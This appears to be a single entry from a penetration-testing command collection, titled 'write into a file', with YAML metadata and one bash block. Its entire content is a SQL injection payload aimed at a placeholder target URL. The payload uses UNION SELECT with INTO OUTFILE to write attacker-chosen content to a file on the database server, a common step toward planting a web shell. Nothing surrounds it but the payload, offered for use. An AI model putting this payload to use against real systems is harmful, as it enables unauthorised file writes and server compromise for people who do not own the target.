---
id: e73682b8-e9aa-46d5-8212-55492bbd1682
name: write into a file
type: command
executor: bash
data: 'http://target-ip/inj.php?id=1 union all select 1,2,3,"content",5 into OUTFILE
  ''outfile''

  '
output: null
created_at: '2020-07-14T18:14:46.799122+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# write into a file

```bash
http://target-ip/inj.php?id=1 union all select 1,2,3,"content",5 into OUTFILE 'outfile'

```
